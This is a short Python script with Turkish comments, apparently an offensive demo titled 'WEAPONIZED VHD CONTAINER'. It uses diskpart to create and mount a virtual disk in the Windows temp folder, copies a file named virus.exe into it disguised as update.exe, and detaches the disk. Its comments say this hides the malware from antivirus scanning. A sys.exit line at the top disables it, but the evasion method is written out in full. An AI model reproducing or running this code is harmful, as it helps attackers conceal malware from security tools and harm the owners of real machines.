import os
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod zararlı yazılımı sanal disk (VHD) içine gizler.")

print("--- WEAPONIZED VHD CONTAINER ---")

def create_malicious_vhd():
    # 1. DİSKPART SCRİPTİ (Weaponized Part)
    # Simülasyon: os.mkdir(".gizli")
    # Gerçek: VHD dosyası oluştur ve bağla (Mount)
    
    script = """
    create vdisk file="C:\\Windows\\Temp\\logs.vhd" maximum=100
    attach vdisk
    create partition primary
    format fs=ntfs quick
    assign letter=Z
    """
    
    with open("setup_disk.txt", "w") as f:
        f.write(script)
        
    print("[*] Sanal Disk (VHD) oluşturuluyor...")
    os.system("diskpart /s setup_disk.txt")
    
    # 2. VİRÜSÜ İÇİNE AT
    print("[*] Virüs Z: sürücüsüne kopyalanıyor...")
    os.system("copy virus.exe Z:\\update.exe")
    
    # 3. DİSKİ KAPAT (Unmount)
    # Disk kapandığında antivirüs içini tarayamaz (Dosya kilitli kutu gibidir)
    os.system("diskpart /s detach_script.txt")
    
    print("💀 VHD HAZIR.")
    print("Antivirüsler 'logs.vhd' dosyasını tarar ama içindeki 'virus.exe'yi göremez.")

if __name__ == "__main__":
    create_malicious_vhd()